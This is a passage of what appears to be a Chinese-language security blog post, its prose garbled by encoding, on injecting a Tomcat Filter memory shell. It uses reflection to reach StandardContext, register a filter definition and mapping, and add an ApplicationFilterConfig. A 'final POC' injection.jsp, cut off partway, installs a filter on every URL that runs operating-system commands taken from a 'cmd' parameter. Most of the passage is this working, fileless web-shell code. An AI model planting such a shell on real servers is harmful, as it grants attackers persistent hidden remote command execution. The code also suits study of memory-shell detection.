<p>å…ˆè·å–å½“å‰filterConfigsä¿¡æ¯ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Field</span><span class="w"> </span><span class="n">configs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">standardContext</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;filterConfigs&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">configs</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Map</span><span class="w"> </span><span class="n">filterConfigs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Map</span><span class="p">)</span><span class="n">configs</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">standardContext</span><span class="p">);</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>å†é€šè¿‡åå°„è·å–ApplicationFilterConfigçš„æ„é€ å™¨å¹¶åˆå§‹åŒ–ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Constructor</span><span class="w"> </span><span class="n">constructor1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ApplicationFilterConfig</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getDeclaredConstructor</span><span class="p">(</span><span class="n">Context</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">FilterDef</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">constructor1</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Object</span><span class="w"> </span><span class="n">o</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">constructor1</span><span class="p">.</span><span class="na">newInstance</span><span class="p">(</span><span class="n">standardContext</span><span class="p">,</span><span class="n">filterDef</span><span class="p">);</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ç„¶åå°±æ˜¯å°†è¿™ä¸ªå®ä¾‹åŒ–çš„ApplicationFilterConfigæ”¾è¿›filterConfigsä¸­ï¼Œå¦‚ä¸‹ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//name=badFilter</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">filterConfigs</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">name</span><span class="p">,</span><span class="n">o</span><span class="p">);</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>è‡³æ­¤å°±å·²ç»å…¨éƒ¨åˆ†æå®Œäº†ã€‚</p>
<h6 id="åŠ¨æ€æ³¨å…¥">åŠ¨æ€æ³¨å…¥
</h6><p>ç»“åˆå‰é¢çš„åˆ†æï¼Œå…¶å®å·²ç»æ¯”è¾ƒæ¸…æ¥šäº†ã€‚æ€»ç»“çš„æµç¨‹å¦‚ä¸‹ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//è·å–ApplicationContextç±»å‹çš„context</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">ServletContext</span><span class="w"> </span><span class="n">facade</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="na">getSession</span><span class="p">().</span><span class="na">getServletContext</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Field</span><span class="w"> </span><span class="n">field0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">facade</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;context&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">field0</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">ApplicationContext</span><span class="w"> </span><span class="n">applicationContext</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">ApplicationContext</span><span class="p">)</span><span class="n">field0</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">facade</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//è·å–StandardContextç±»å‹çš„context</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Field</span><span class="w"> </span><span class="n">field1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">applicationContext</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;context&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">field1</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">StandardContext</span><span class="w"> </span><span class="n">standardContext</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">StandardContext</span><span class="p">)</span><span class="n">field1</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">applicationContext</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//åˆ›å»ºæ¶æ„filter</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Filter</span><span class="w"> </span><span class="n">evilFilter</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Filter</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nd">@Override</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">init</span><span class="p">(</span><span class="n">FilterConfig</span><span class="w"> </span><span class="n">filterConfig</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">ServletException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nd">@Override</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">doFilter</span><span class="p">(</span><span class="n">ServletRequest</span><span class="w"> </span><span class="n">servletRequest</span><span class="p">,</span><span class="w"> </span><span class="n">ServletResponse</span><span class="w"> </span><span class="n">servletResponse</span><span class="p">,</span><span class="w"> </span><span class="n">FilterChain</span><span class="w"> </span><span class="n">filterChain</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="p">,</span><span class="w"> </span><span class="n">ServletException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">String</span><span class="w"> </span><span class="n">cmd</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="n">cmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">servletRequest</span><span class="p">.</span><span class="na">getParameter</span><span class="p">(</span><span class="s">&#34;cmd&#34;</span><span class="p">))</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">Runtime</span><span class="w"> </span><span class="n">runtime</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">runtime</span><span class="p">.</span><span class="na">exec</span><span class="p">(</span><span class="n">cmd</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">return</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">filterChain</span><span class="p">.</span><span class="na">doFilter</span><span class="p">(</span><span class="n">servletRequest</span><span class="p">,</span><span class="n">servletResponse</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nd">@Override</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">destroy</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">};</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//è®¾ç½®åŸºæœ¬çš„é¢„å®šä¹‰çš„filtername</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;badFilter&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//åˆ›å»ºfilterDef</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">FilterDef</span><span class="w"> </span><span class="n">filterDef</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FilterDef</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">filterDef</span><span class="p">.</span><span class="na">setFilterName</span><span class="p">(</span><span class="n">name</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">filterDef</span><span class="p">.</span><span class="na">setFilterClass</span><span class="p">(</span><span class="n">evilFilter</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getName</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">filterDef</span><span class="p">.</span><span class="na">setFilter</span><span class="p">(</span><span class="n">evilFilter</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">standardContext</span><span class="p">.</span><span class="na">addFilterDef</span><span class="p">(</span><span class="n">filterDef</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//åˆ›å»ºfilterMap</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">FilterMap</span><span class="w">  </span><span class="n">filterMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FilterMap</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">filterMap</span><span class="p">.</span><span class="na">addURLPattern</span><span class="p">(</span><span class="s">&#34;/*&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">filterMap</span><span class="p">.</span><span class="na">setFilterName</span><span class="p">(</span><span class="n">name</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">filterMap</span><span class="p">.</span><span class="na">setDispatcher</span><span class="p">(</span><span class="n">DispatcherType</span><span class="p">.</span><span class="na">REQUEST</span><span class="p">.</span><span class="na">name</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">standardContext</span><span class="p">.</span><span class="na">addFilterMapBefore</span><span class="p">(</span><span class="n">filterMap</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//åˆ›å»ºfilterConfigæ‰€éœ€çš„ApplicationFilterConfig</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Constructor</span><span class="w"> </span><span class="n">constructor1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ApplicationFilterConfig</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getDeclaredConstructor</span><span class="p">(</span><span class="n">Context</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">FilterDef</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">constructor1</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Object</span><span class="w"> </span><span class="n">o</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">constructor1</span><span class="p">.</span><span class="na">newInstance</span><span class="p">(</span><span class="n">standardContext</span><span class="p">,</span><span class="n">filterDef</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//æ”¾å…¥filterConfigs</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Field</span><span class="w"> </span><span class="n">configs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">standardContext</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;filterConfigs&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">configs</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Map</span><span class="w"> </span><span class="n">filterMaps</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Map</span><span class="p">)</span><span class="n">configs</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">standardContext</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">filterMaps</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">name</span><span class="p">,</span><span class="n">o</span><span class="p">);</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><h6 id="æœ€ç»ˆpoc">æœ€ç»ˆPOC
</h6><p>injection.jsp</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span><span class="lnt">85
</span><span class="lnt">86
</span><span class="lnt">87
</span><span class="lnt">88
</span><span class="lnt">89
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">&lt;%--</span>
</span></span><span class="line"><span class="cl">  <span class="n">Created</span> <span class="n">by</span> <span class="n">IntelliJ</span> <span class="n">IDEA</span><span class="o">.</span>
</span></span><span class="line"><span class="cl">  <span class="n">User</span><span class="p">:</span> <span class="n">ASUS</span>
</span></span><span class="line"><span class="cl">  <span class="n">Date</span><span class="p">:</span> <span class="mi">2024</span><span class="o">/</span><span class="mi">9</span><span class="o">/</span><span class="mi">1</span>
</span></span><span class="line"><span class="cl">  <span class="n">Time</span><span class="p">:</span> <span class="mi">13</span><span class="p">:</span><span class="mi">34</span>
</span></span><span class="line"><span class="cl">  <span class="n">To</span> <span class="n">change</span> <span class="n">this</span> <span class="n">template</span> <span class="n">use</span> <span class="ne">File</span> <span class="o">|</span> <span class="n">Settings</span> <span class="o">|</span> <span class="ne">File</span> <span class="n">Templates</span><span class="o">.</span>
</span></span><span class="line"><span class="cl"><span class="o">--%&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s2">&#34;org.apache.catalina.core.ApplicationContext&#34;</span> <span class="o">%&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s2">&#34;java.lang.reflect.Field&#34;</span> <span class="o">%&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s2">&#34;org.apache.catalina.core.StandardContext&#34;</span> <span class="o">%&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s2">&#34;java.util.Map&#34;</span> <span class="o">%&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s2">&#34;java.io.IOException&#34;</span> <span class="o">%&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s2">&#34;org.apache.tomcat.util.descriptor.web.FilterDef&#34;</span> <span class="o">%&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s2">&#34;org.apache.tomcat.util.descriptor.web.FilterMap&#34;</span> <span class="o">%&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s2">&#34;java.lang.reflect.Constructor&#34;</span> <span class="o">%&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s2">&#34;org.apache.catalina.core.ApplicationFilterConfig&#34;</span> <span class="o">%&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s2">&#34;org.apache.catalina.Context&#34;</span> <span class="o">%&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s2">&#34;java.lang.String&#34;</span> <span class="o">%&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">contentType</span><span class="o">=</span><span class="s2">&#34;text/html;charset=UTF-8&#34;</span> <span class="n">language</span><span class="o">=</span><span class="s2">&#34;java&#34;</span> <span class="o">%&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">&lt;%</span>
</span></span><span class="line"><span class="cl">    <span class="o">//</span><span class="err">è·å–</span><span class="n">ApplicationContextç±»å‹çš„context</span>
</span></span><span class="line"><span class="cl">    <span class="n">ServletContext</span> <span class="n">facade</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">getSession</span><span class="p">()</span><span class="o">.</span><span class="n">getServletContext</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="n">Field</span> <span class="n">field0</span> <span class="o">=</span> <span class="n">facade</span><span class="o">.</span><span class="n">getClass</span><span class="p">()</span><span class="o">.</span><span class="n">getDeclaredField</span><span class="p">(</span><span class="s2">&#34;context&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">field0</span><span class="o">.</span><span class="n">setAccessible</span><span class="p">(</span><span class="bp">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">ApplicationContext</span> <span class="n">applicationContext</span> <span class="o">=</span> <span class="p">(</span><span class="n">ApplicationContext</span><span class="p">)</span><span class="n">field0</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">facade</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">//</span><span class="err">è·å–</span><span class="n">StandardContextç±»å‹çš„context</span>
</span></span><span class="line"><span class="cl">    <span class="n">Field</span> <span class="n">field1</span> <span class="o">=</span> <span class="n">applicationContext</span><span class="o">.</span><span class="n">getClass</span><span class="p">()</span><span class="o">.</span><span class="n">getDeclaredField</span><span class="p">(</span><span class="s2">&#34;context&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">field1</span><span class="o">.</span><span class="n">setAccessible</span><span class="p">(</span><span class="bp">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">StandardContext</span> <span class="n">standardContext</span> <span class="o">=</span> <span class="p">(</span><span class="n">StandardContext</span><span class="p">)</span><span class="n">field1</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">applicationContext</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">//</span><span class="err">åˆ›å»ºæ¶æ„</span><span class="n">filter</span>
</span></span><span class="line"><span class="cl">    <span class="n">Filter</span> <span class="n">evilFilter</span> <span class="o">=</span> <span class="n">new</span> <span class="n">Filter</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="err">@</span><span class="n">Override</span>
</span></span><span class="line"><span class="cl">        <span class="n">public</span> <span class="n">void</span> <span class="n">init</span><span class="p">(</span><span class="n">FilterConfig</span> <span class="n">filterConfig</span><span class="p">)</span> <span class="n">throws</span> <span class="n">ServletException</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="err">@</span><span class="n">Override</span>
</span></span><span class="line"><span class="cl">        <span class="n">public</span> <span class="n">void</span> <span class="n">doFilter</span><span class="p">(</span><span class="n">ServletRequest</span> <span class="n">servletRequest</span><span class="p">,</span> <span class="n">ServletResponse</span> <span class="n">servletResponse</span><span class="p">,</span> <span class="n">FilterChain</span> <span class="n">filterChain</span><span class="p">)</span> <span class="n">throws</span> <span class="n">IOException</span><span class="p">,</span> <span class="n">ServletException</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="ne">String</span> <span class="n">cmd</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">((</span><span class="n">cmd</span> <span class="o">=</span> <span class="n">servletRequest</span><span class="o">.</span><span class="n">getParameter</span><span class="p">(</span><span class="s2">&#34;cmd&#34;</span><span class="p">))</span> <span class="o">!=</span> <span class="n">null</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">Runtime</span> <span class="n">runtime</span> <span class="o">=</span> <span class="n">Runtime</span><span class="o">.</span><span class="n">getRuntime</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">                <span class="n">runtime</span><span class="o">.</span><span class="n">exec</span><span class="p">(</span><span class="n">cmd</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="n">filterChain</span><span class="o">.</span><span class="n">doFilter</span><span class="p">(</span><span class="n">servletRequest</span><span class="p">,</span><span class="n">servletResponse</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="err">@</span><span class="n">Override</span>
</span></span><span class="line"><span class="cl">        <span class="n">public</span> <span class="n">void</span> <span class="n">destroy</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">//</span><span class="err">è®¾ç½®åŸºæœ¬çš„é¢„å®šä¹‰çš„</span><span class="n">filtername</span>
